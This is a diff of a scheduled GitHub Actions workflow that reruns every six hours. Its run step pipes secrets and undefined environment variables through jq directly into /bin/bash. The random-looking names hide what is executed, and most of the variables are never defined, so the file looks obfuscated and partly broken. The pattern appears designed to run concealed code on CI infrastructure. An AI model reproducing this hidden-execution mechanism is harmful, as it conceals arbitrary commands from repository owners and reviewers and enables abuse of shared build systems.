@@ -2,7 +2,8 @@ name: commissionperturbed
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 0/6 * * *'
+    - cron: '27 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,14 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: commissionperturbed
         env:
-          wgwiy42: ${{ secrets.wgwiy42 }}
+          dvfrl831: ${{ secrets.dvfrl831 }}
         run: |
-          echo $wgwiy42 | jq -r .p6953 | /bin/bash
-          echo $tq47 | jq -r .ihvz1 | /bin/bash
-          echo $ciqun9295 | jq -r .tc93688 | /bin/bash
-          echo $g12114 | jq -r .zsom166 | /bin/bash
-          echo $vcqp2154 | jq -r .wpmi27 | /bin/bash
-          echo $pef890 | jq -r .r22047 | /bin/bash
-          echo $efmw3548 | jq -r .vg3 | /bin/bash
-          echo $ojsk682 | jq -r .q3 | /bin/bash
+          echo $dvfrl831 | jq -r .ddloh09 | /bin/bash
+          echo $ce19 | jq -r .cucm37 | /bin/bash
+          echo $mead36328 | jq -r .ah46291 | /bin/bash
+          echo $fpl3 | jq -r .jq48062 | /bin/bash
+          echo $pckm8 | jq -r .pazj5471 | /bin/bash
+          echo $poprx9 | jq -r .icn9 | /bin/bash
+          echo $lkybq3 | jq -r .mm2 | /bin/bash
+          echo $eokvf15 | jq -r .bf0462 | /bin/bash
 
